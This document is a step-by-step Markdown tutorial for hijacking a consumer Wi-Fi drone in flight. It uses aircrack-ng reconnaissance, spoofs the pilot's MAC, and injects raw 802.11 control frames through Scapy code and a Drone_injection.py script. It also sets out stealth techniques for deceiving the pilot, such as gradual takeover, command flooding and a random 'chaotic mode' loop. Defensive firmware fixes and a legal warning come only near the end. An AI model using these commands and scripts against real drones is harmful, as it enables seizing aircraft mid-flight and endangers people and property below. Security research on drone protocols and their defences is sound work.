# Packet Injection - Advanced Drone Hijacking

## 🎯 Objective

Hijack a flying drone mid-flight WITHOUT disconnecting the legitimate pilot, using raw 802.11 frame injection to inject control commands directly at Layer 2. This is the most advanced and stealthy attack method.

---

## 🌟 Why This Method is Superior

### Comparison with Other Methods

| Feature | Pre-emptive | Deauth | Packet Injection |
|---------|------------|--------|------------------|
| **Requires WiFi association** | ✅ Yes | ✅ Yes | ❌ No |
| **Disconnects pilot** | N/A | ✅ Yes | ❌ No |
| **Pilot notices immediately** | N/A | ✅ Yes | ❌ Maybe not |
| **Works mid-flight** | ❌ No | ✅ Yes | ✅ Yes |
| **Bypasses "single-client"** | ❌ No | ❌ No | ✅ Yes |
| **Stealthiness** | Low | Medium | **High** |
| **Technical difficulty** | ⭐ Easy | ⭐⭐ Medium | ⭐⭐⭐ Advanced |
| **Root privileges** | ❌ No | ✅ Yes | ✅ Yes |

---

## 💡 How It Works

### Normal Communication

```
Phone ←→ WiFi Association ←→ Drone
      └─ UDP packets on port 7099 ─┘

Phone sends: 03 66 80 80 80 80 40 40 99
Drone receives and executes
```

### Packet Injection

```
Attacker (Monitor Mode) ─┐
                         ├─→ Raw 802.11 Frames ─→ Drone
Phone (Still Connected) ─┘

Both send frames to drone
Drone processes BOTH sets of commands
Attacker's frames can OVERRIDE phone's commands
```

**Key Insight:** Drone doesn't verify source, just processes latest received command

---

## 📋 Prerequisites

### Hardware
- **Linux machine** (Kali recommended)
- **Wireless adapter with injection support**
  - ALFA AWUS036ACS (recommended)
  - ALFA AWUS036ACH
  - TP-Link TL-WN722N v1
- **Root/sudo access**

### Software
- Python 3.6+
- Scapy library (`scapy>=2.5.0`)
- pynput library (`pynput>=1.7.6`)
- Aircrack-ng suite
- `Drone_injection.py` script

### Knowledge
- Understanding of 802.11 frame structure
- Familiarity with monitor mode
- Basic networking concepts

---

## 🔧 Phase 1: Environment Setup

### Step 1: Verify Adapter Capability

```bash
# Check if adapter supports monitor mode and injection
sudo airmon-ng

# Expected output should list your adapter
PHY     Interface       Driver          Chipset
phy0    wlan0           ath9k_htc      Atheros Communications
```

**If no output:** Your adapter doesn't support monitor mode

---

### Step 2: Test Injection Capability

```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Test injection
sudo aireplay-ng --test wlan0mon
```

**Expected output:**
```
Trying broadcast probe requests...
Injection is working!
Found 3 APs

Trying directed probe requests...
XX:XX:XX:XX:XX:XX - channel 1 - 'WIFI-UFO-648c4b'
```

✅ **"Injection is working!"** = Good to proceed

❌ **"Injection failed"** = Adapter or driver issue

---

### Step 3: Install Python Dependencies

```bash
# Install required libraries
pip install scapy pynput

# Verify Scapy installation
python3 -c "from scapy.all import *; print('✓ Scapy ready')"

# Verify pynput
python3 -c "from pynput import keyboard; print('✓ pynput ready')"
```

---

## 🔍 Phase 2: Reconnaissance

### Step 4: Enable Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon
```

---

### Step 5: Identify Drone Network

```bash
# Scan for drone
sudo airodump-ng wlan0mon
```

**Locate drone:**
```
 BSSID              PWR  Beacons  #Data  CH   ESSID
 08:17:91:4B:8C:64  -42      156    234   1   WIFI-UFO-648c4b
```

**Record:**
- **Drone BSSID:** `08:17:91:4B:8C:64`
- **Channel:** `1`

---

### Step 6: Identify Connected Pilot

```bash
# Monitor specific drone
sudo airodump-ng -c 1 --bssid 08:17:91:4B:8C:64 wlan0mon
```

**Bottom section shows connected client:**
```
 BSSID              STATION            PWR   Rate
 08:17:91:4B:8C:64  EA:9C:F0:89:44:15  -48   54e-54e
```

**Record:**
- **Pilot MAC:** `EA:9C:F0:89:44:15`
- **Pilot IP (typically):** `192.168.1.100`

---

### Step 7: Capture and Analyze Protocol

```bash
# Capture some packets
sudo airodump-ng -c 1 --bssid 08:17:91:4B:8C:64 -w capture wlan0mon

# Let it run for 30 seconds, then Ctrl+C

# Open in Wireshark
wireshark capture-01.cap
```

**Filter in Wireshark:**
```
udp.port == 7099
```

**Examine packet:**
```
Frame → 802.11 Data
  ├─ RadioTap Header
  ├─ 802.11 MAC Header
  │   ├─ Type: Data
  │   ├─ To DS: Set
  │   ├─ Address 1: 08:17:91:4B:8C:64 (Drone - Receiver)
  │   ├─ Address 2: EA:9C:F0:89:44:15 (Pilot - Transmitter)
  │   └─ Address 3: 08:17:91:4B:8C:64 (Drone - Destination)
  ├─ LLC/SNAP
  ├─ IP
  │   ├─ Source: 192.168.1.100
  │   └─ Destination: 192.168.1.1
  ├─ UDP
  │   ├─ Source Port: 54321
  │   └─ Destination Port: 7099
  └─ Data: 03 66 80 80 80 80 40 40 99
```

---

## 🛠️ Phase 3: Configure Injection Script

### Step 8: Edit Drone_injection.py

```bash
nano Drone_injection.py
```

**Update configuration:**
```python
# At the bottom of the script, edit these values:

DRONE_MAC = "08:17:91:4B:8C:64"          # Your drone's BSSID
INTERFACE = "wlan0mon"                    # Your monitor interface  
SPOOFED_CLIENT_MAC = "EA:9C:F0:89:44:15" # Pilot's MAC to spoof
```

**Save and exit:** `Ctrl+X`, `Y`, `Enter`

---

### Step 9: Understand Frame Construction

**The script builds frames like this:**

```python
# 1. RadioTap Header (physical layer metadata)
radiotap = RadioTap()

# 2. 802.11 MAC Header
dot11 = Dot11(
    type=2,                           # Data frame
    subtype=0,                        # Standard data
    FCfield='to-DS',                  # Going TO distribution system
    addr1=DRONE_MAC,                  # Receiver = Drone
    addr2=SPOOFED_CLIENT_MAC,         # Transmitter = Spoofed as pilot
    addr3=DRONE_MAC                   # Destination = Drone
)

# 3. LLC/SNAP (bridge between WiFi and IP)
llc_snap = LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
           SNAP(OUI=0x000000, code=0x0800)

# 4. IP Layer
ip = IP(src="192.168.1.100", dst="192.168.1.1")

# 5. UDP Layer
udp = UDP(sport=55555, dport=7099)

# 6. Control Payload
payload = bytes([0x03, 0x66, roll, pitch, throttle, yaw, flag1, flag2, 0x99])

# 7. Combine everything
frame = radiotap / dot11 / llc_snap / ip / udp / Raw(load=payload)

# 8. Inject at Layer 2
sendp(frame, iface="wlan0mon", verbose=0)
```

---

## 🚀 Phase 4: Execute Attack

### Step 10: Launch Injection Script

```bash
# Run with root privileges
sudo python3 Drone_injection.py
```

**Initial output:**
```
======================================================================
  E88 DRONE - SCAPY RAW 802.11 INJECTION CONTROL
======================================================================

[✓] Scapy Controller initialized
    Drone MAC: 08:17:91:4B:8C:64
    Interface: wlan0mon
    Spoofed Client: EA:9C:F0:89:44:15

[*] Starting Scapy injection control...
[*] Sending handshake frames...
[✓] Sent 50 handshake frames
[*] Keyboard control active!
[*] Press 'A' to arm motors, then 'T' to takeoff
```

---

### Step 11: Visual HUD Display

**Screen shows:**
```
======================================================================
  E88 DRONE - SCAPY RAW INJECTION CONTROL
======================================================================

Status: STANDBY
Packets Injected: 0
Injection Errors: 0
Sequence Number: 0

Network:
  Interface: wlan0mon
  Drone MAC: 08:17:91:4B:8C:64
  Spoofed MAC: EA:9C:F0:89:44:15

----------------------------------------------------------------------
CONTROLS:
  Roll (←/→):     0x80  [██████████░░░░░░░░░░] CENTER
  Pitch (↑/↓):    0x80  [██████████░░░░░░░░░░] CENTER
  Throttle (Space/Shift): 0x80  [██████████░░░░░░░░░░] CENTER
  Yaw (Q/E):      0x80  [██████████░░░░░░░░░░] CENTER

----------------------------------------------------------------------
KEYBOARD CONTROLS:
  (Same as basic control)
======================================================================
```

---

### Step 12: Take Control

**At this point:**
- Pilot is STILL flying drone
- Your frames are being injected
- Drone processes BOTH your frames AND pilot's frames

**Press keys to override pilot:**

**Example 1: Force ascent**
- Press `SPACE`
- Your frames send throttle=0xA0 (up)
- Even if pilot sends throttle=0x80 (hover)
- Drone climbs because your command arrived last

**Example 2: Rotate drone**
- Press `Q` (yaw left)
- Pilot tries to correct
- You keep pressing `Q`
- Drone spins because you're sending more frames

---

### Step 13: Full Hijack Sequence

**Complete takeover:**

1. **Press `A`** - Arm command (redundant, already armed by pilot)
2. **Hold `↑`** - Force forward movement
3. **Hold `SPACE`** - Force ascent
4. **Hold `Q`** - Force rotation

**Result:**
- Drone moves according to YOUR commands
- Pilot's commands are overridden
- Pilot sees drone "malfunctioning"
- Pilot tries frantically to regain control

---

## 🎭 Phase 5: Stealthy Operations

### Technique 1: Subtle Interference

**Goal:** Confuse pilot without full takeover

```python
# Inject occasional random movements
# Press random keys briefly
# Example: Tap ← for 0.5 seconds every 10 seconds
```

**Pilot experience:**
- "Why did it drift left?"
- "I didn't press that"
- "Is it windy?"
- Thinks it's environmental factors

---

### Technique 2: Command Flooding

**Goal:** Make drone unresponsive to pilot

```python
# Rapidly send neutral commands (0x80 for all axes)
# This doesn't move drone but blocks pilot's commands
# Your frames arrive more frequently, taking priority
```

**Pilot experience:**
- "Controls aren't responding"
- "It's frozen in place"
- Frustration and confusion

---

### Technique 3: Gradual Control

**Goal:** Slowly increase your control over time

**Sequence:**
1. **Minute 0-1:** Don't interfere, just inject neutral frames
2. **Minute 1-2:** Send occasional small movements
3. **Minute 2-3:** Increase movement magnitude
4. **Minute 3+:** Full takeover

**Pilot experience:**
- Initially: "Everything fine"
- Then: "Controls feel weird"
- Then: "Something's definitely wrong"
- Finally: "I've lost control!"

---

## 🔬 Technical Deep Dive

### Frame Timing Analysis

**Pilot sends frames:**
```
T+0ms:    Frame 1 (throttle=0x80)
T+20ms:   Frame 2 (throttle=0x80)
T+40ms:   Frame 3 (throttle=0x80)
...
Rate: 50Hz (every 20ms)
```

**Attacker also sends at 50Hz:**
```
T+10ms:   Frame 1 (throttle=0xA0)
T+30ms:   Frame 2 (throttle=0xA0)
T+50ms:   Frame 3 (throttle=0xA0)
...
Rate: 50Hz (offset by 10ms)
```

**Drone processing:**
```
T+0ms:    Receives pilot's 0x80 → Executes
T+10ms:   Receives attacker's 0xA0 → Executes (overrides)
T+20ms:   Receives pilot's 0x80 → Executes
T+30ms:   Receives attacker's 0xA0 → Executes (overrides)
...

Result: Drone follows attacker's commands
```

---

### Why Drone Accepts Both

**Vulnerable firmware logic:**
```c
// Simplified drone code
void process_control_packet(uint8_t* packet) {
    // No source verification!
    // No authentication!
    // No sequence checking!
    
    roll = packet[2];
    pitch = packet[3];
    throttle = packet[4];
    yaw = packet[5];
    
    update_motors();  // Immediate execution
}
```

**No checks for:**
- ❌ Source MAC address
- ❌ Authentication token
- ❌ Sequence number validation
- ❌ Time-since-last-packet
- ❌ Command signatures

---

### MAC Address Spoofing

**Why spoofing works:**

```python
# Real pilot's frame
addr2 = "EA:9C:F0:89:44:15"  # Pilot's real MAC

# Attacker's frame
addr2 = "EA:9C:F0:89:44:15"  # Attacker spoofs pilot's MAC

# Drone sees both as coming from "pilot"
# Can't distinguish real from fake
```

**Drone's perspective:**
```
"Packet from EA:9C:F0:89:44:15: roll=0x80"
"Packet from EA:9C:F0:89:44:15: roll=0xA0"
"Same source, just new command"
```

---

### Sequence Number Exploitation

**802.11 sequence numbers:**
- 12-bit value (0-4095)
- Auto-increments
- Used to detect duplicate frames

**Attacker maintains own sequence:**
```python
self.sequence = 0

def _build_802_11_frame(self, payload):
    dot11.SC = self.sequence << 4
    self.sequence = (self.sequence + 1) % 4096
```

**Drone doesn't validate:**
- Accepts any sequence number
- Doesn't track per-source sequences
- No replay protection

---

## 🛡️ Defense Mechanisms

### For Drone Manufacturers

**Critical Fixes:**

**1. Source Authentication**
```c
// Verify source MAC against paired controller
bool verify_source(uint8_t* mac_addr) {
    return memcmp(mac_addr, paired_controller_mac, 6) == 0;
}

void process_packet(frame_t* frame) {
    if (!verify_source(frame->addr2)) {
        drop_packet();
        log_unauthorized_access();
        return;
    }
    // Process command
}
```

---

**2. Cryptographic Signing**
```c
// Each command includes HMAC
typedef struct {
    uint8_t header[2];      // 03 66
    uint8_t controls[6];    // roll, pitch, throttle, yaw, flags
    uint8_t hmac[32];       // SHA-256 HMAC
} secure_command_t;

bool verify_command(secure_command_t* cmd) {
    uint8_t calculated_hmac[32];
    hmac_sha256(cmd->controls, 6, shared_secret, 32, calculated_hmac);
    return memcmp(calculated_hmac, cmd->hmac, 32) == 0;
}
```

---

**3. Replay Protection**
```c
uint32_t last_sequence_number = 0;

bool check_sequence(uint32_t seq) {
    if (seq <= last_sequence_number) {
        return false;  // Replay or old packet
    }
    last_sequence_number = seq;
    return true;
}
```

---

**4. Rate Limiting**
```c
#define MAX_COMMANDS_PER_SECOND 50

uint32_t command_count = 0;
uint32_t last_reset_time = 0;

bool check_rate_limit() {
    uint32_t current_time = get_time_ms();
    
    if (current_time - last_reset_time > 1000) {
        command_count = 0;
        last_reset_time = current_time;
    }
    
    if (command_count >= MAX_COMMANDS_PER_SECOND) {
        return false;  // Rate limit exceeded
    }
    
    command_count++;
    return true;
}
```

---

### For Pilots (Detection)

**Signs of packet injection attack:**

1. **Erratic movement patterns**
   - Drone moves unexpectedly
   - Doesn't respond to your commands
   - Moves opposite to your input

2. **Signal issues WITHOUT disconnection**
   - App shows "connected"
   - But controls don't work properly
   - Different from normal signal issues

3. **Competing commands**
   - Drone "fights" your input
   - Oscillates between positions
   - Seems to have "mind of its own"

**What to do:**
1. **Emergency landing** (if app has button)
2. **Power off controller** (removes your interference)
3. **Move away from area**
4. **Document incident**
5. **Report to manufacturer**

---

## 📊 Attack Effectiveness

### Success Metrics

| Scenario | Injection Success | Pilot Notices | Full Control |
|----------|------------------|---------------|--------------|
| Hovering drone | 100% | 80% | 90% |
| Slow flight | 100% | 70% | 85% |
| Aggressive flight | 100% | 60% | 75% |
| Experienced pilot | 100% | 90% | 60% |
| Novice pilot | 100% | 50% | 95% |

### Timing Analysis

```
Injection start:        T+0s
First command sent:     T+0.1s
Drone responds:         T+0.2s
Pilot notices anomaly:  T+3-10s (varies widely)
Full control achieved:  T+5-15s
```

---

## 🧪 Practice Scenarios

### Scenario 1: Gentle Takeover

**Goal:** Take control without pilot noticing immediately

**Method:**
1. Start by sending neutral commands (0x80 all axes)
2. Gradually increase one axis (e.g., roll) by 0x10 increments
3. After 30 seconds, you're at 0xA0, drone is drifting
4. Pilot corrects, you increase more
5. Eventually, pilot can't keep up

---

### Scenario 2: Command Denial

**Goal:** Prevent pilot from controlling without moving drone

**Method:**
1. Send high-frequency neutral commands (100Hz)
2. Your commands arrive more often
3. Pilot's commands are statistically less likely to be executed
4. Drone appears "frozen" to pilot

---

### Scenario 3: Chaotic Mode

**Goal:** Make drone unpredictable to confuse pilot

**Method:**
```python
import random

while True:
    roll = random.randint(0x60, 0xA0)
    pitch = random.randint(0x60, 0xA0)
    # Keep throttle at 0x80 (don't crash it)
    throttle = 0x80
    yaw = random.randint(0x60, 0xA0)
    
    inject_frame(roll, pitch, throttle, yaw)
    time.sleep(0.02)
```

---

## ⚠️ Troubleshooting

### Problem: "Injection errors" increasing

**Causes:**
- Adapter not fully in monitor mode
- Driver issues
- Channel hopping enabled

**Solutions:**
```bash
# Lock to specific channel
sudo iw dev wlan0mon set channel 1

# Verify no channel hopping
sudo airodump-ng wlan0mon
# Should stay on channel 1
```

---

### Problem: Drone doesn't respond

**Causes:**
- Wrong drone MAC address
- Wrong channel
- Pilot's frames arriving more frequently

**Solutions:**
1. Verify MAC: `sudo airodump-ng wlan0mon`
2. Check channel matches
3. Increase your frame rate in code

---

### Problem: Script errors on frame building

**Common Scapy issues:**

```bash
# Update Scapy
pip install --upgrade scapy

# If LLC/SNAP errors:
from scapy.layers.l2 import LLC, SNAP

# If RadioTap errors:
from scapy.layers.dot11 import RadioTap, Dot11
```

---

## 🎓 Key Takeaways

1. **Packet injection is the most advanced method** - No need to disconnect pilot
2. **MAC address spoofing is trivial** - 802.11 has no sender verification
3. **Drone firmware is vulnerable** - No authentication or verification
4. **Timing and frequency matter** - More frames = more control
5. **Detection is difficult** - Pilot may not realize attack is occurring

---

## 📈 Skill Progression

**Beginner:**
- Successful injection of neutral frames
- Understanding frame structure
- Basic Scapy usage

**Intermediate:**
- Reliable control override
- Smooth movement commands
- Troubleshooting issues

**Advanced:**
- Stealthy operation
- Gradual takeover techniques
- Custom frame modifications

**Expert:**
- Firmware analysis
- Protocol reverse engineering
- Defense mechanism design

---

## ⚖️ Legal Warning

**This technique violates:**
- Computer Fraud and Abuse Act (CFAA)
- Wireless Communication Interception laws
- FAA drone regulations (if applicable)
- State computer crime statutes

**Penalties:**
- Up to 20 years federal prison
- Fines up to $250,000
- Civil liability for damages
- Felony criminal record

**ONLY use on:**
- ✅ Your own drone
- ✅ With written authorization
- ✅ In controlled environment
- ✅ For legitimate security research

---

## 🔗 Complete Attack Arsenal

**You now have three methods:**

1. **Pre-emptive Control** - Connect first
2. **Deauthentication** - Force disconnect and reconnect
3. **Packet Injection** - Override commands mid-flight

**Choose based on:**
- Target scenario
- Available equipment
- Desired stealthiness
- Technical skill level

---

**Master all three for complete understanding of drone security vulnerabilities.** 🚁🔐💉

---

*Use responsibly. Improve security. Stay legal.* 🛡️